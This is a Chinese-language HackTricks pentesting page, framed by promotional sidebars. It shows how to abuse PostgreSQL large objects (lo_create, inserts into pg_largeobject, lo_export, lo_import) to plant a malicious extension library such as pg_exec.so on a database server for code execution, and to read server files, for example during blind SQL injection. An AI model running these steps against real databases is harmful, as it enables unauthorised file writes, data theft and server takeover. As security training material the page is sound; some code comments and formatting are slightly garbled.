<details>

<summary><strong>零基础学习AWS黑客技术成为高手</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来**分享您的黑客技巧**。

</details>


# PostgreSQL大型对象

PostgreSQL公开了一个称为**大型对象**（`pg_largeobject`表）的结构，用于存储难以完整处理的数据（如图像或PDF文档）。与`COPY TO`功能相比，**大型对象**的优势在于它们**持有的数据**可以**导出回文件系统**，作为**原始导入文件的完整副本**。

为了**在此表中保存完整文件**，您首先需要在提到的表中**创建一个对象**（由**LOID**标识），然后**插入2KB的数据块**到这个对象中。非常重要的是所有的**数据块都是2KB**（可能除了最后一个）**或者**导出到文件系统的**功能将无法工作**。

为了将您的**二进制数据**分割成**2KB大小的数据块**，您可以执行：
```bash
split -b 2048 pg_exec.so #This will create files of size 2KB
```
为了将每个创建的文件编码为Base64或Hex，您可以使用：
```bash
base64 -w 0 <Chunk_file> #Encoded in 1 line
xxd -ps -c 99999999999 <Chunk_file> #Encoded in 1 line
```
{% hint style="info" %}
在利用这个漏洞时，请记住你必须发送**2KB明文字节的块**（不是2KB的base64或十六进制编码字节）。如果你尝试自动化这个过程，**十六进制编码**文件的大小是**双倍**（那么你需要为每个块发送4KB的编码数据），而**base64**编码文件的大小是`ceil(n / 3) * 4`
{% endhint %}

此外，在调试过程中，你可以查看创建的大型对象的内容：
```sql
select loid, pageno, encode(data, 'escape') from pg_largeobject;
```
# 使用 lo\_creat & Base64

首先，我们需要创建一个 LOID，用于保存二进制数据：
```sql
SELECT lo_creat(-1);       -- returns OID of new, empty large object
SELECT lo_create(173454);   -- attempts to create large object with OID 43213
```
如果您正在利用**盲目SQL注入**，您会更感兴趣使用`lo_create`搭配一个**固定的LOID**，这样您就**知道在哪里**需要**上传**内容。\
另外，请注意，函数名称是`lo_creat`和`lo_create`，这里没有语法错误。

LOID用于在`pg_largeobject`表中识别对象。可以通过以下方式将2KB大小的数据块插入到`pg_largeobject`表中：
```sql
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 0, decode('<B64 chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 1, decode('<B64 chunk2>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 3, decode('<B64 chunk2>', 'base64'));
```
```markdown
最后，您可以执行以下操作将文件导出到文件系统（在此示例中使用的 LOID 是 `173454`）：
```
```sql
SELECT lo_export(173454, '/tmp/pg_exec.so');
```
{% hint style="info" %}
请注意，在最新版本的 postgres 中，您可能需要**不指定任何路径**就**上传扩展**。[**阅读此内容以获取更多信息**。](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

您可能对在导出大型对象后删除它感兴趣：
```sql
SELECT lo_unlink(173454);  -- deletes large object with OID 173454
```
# 使用 lo\_import & Hex

在这个场景中，将使用 lo\_import 来创建一个大型对象。幸运的是，在这种情况下，你可以（也不能）指定你想要使用的 LOID：
```sql
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts');
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts', 173454);
```
在创建对象后，您可以开始在每个页面上插入数据（记住，您必须插入2KB的数据块）：
```sql
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=0;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=1;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=2;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=3;
```
HEX 必须只包含十六进制数（不包括 `0x` 或 `\x`），例如：
```sql
update pg_largeobject set data=decode('68656c6c6f', 'hex') where loid=173454 and pageno=0;
```
最后，将数据导出到文件并删除大型对象：
```sql
select lo_export(173454, 'C:\\path\to\pg_extension.dll');
select lo_unlink(173454);  -- deletes large object with OID 173454
```
{% hint style="info" %}
请注意，在最新版本的PostgreSQL中，您可能需要**不指定任何路径**就**上传扩展**。[**阅读此内容以获取更多信息**。](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

# 限制

阅读PostgreSQL中的大型对象文档后，我们可以发现**大型对象可以有ACL**（访问控制列表）。可以配置**新的大型对象**，使您的用户即使是由您的用户创建的，也**没有足够的权限**来读取它们。

然而，可能存在**旧对象的ACL允许当前用户读取它**，那么我们可以泄露该对象的内容。


<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零到英雄学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来**分享您的黑客技巧**。

</details>
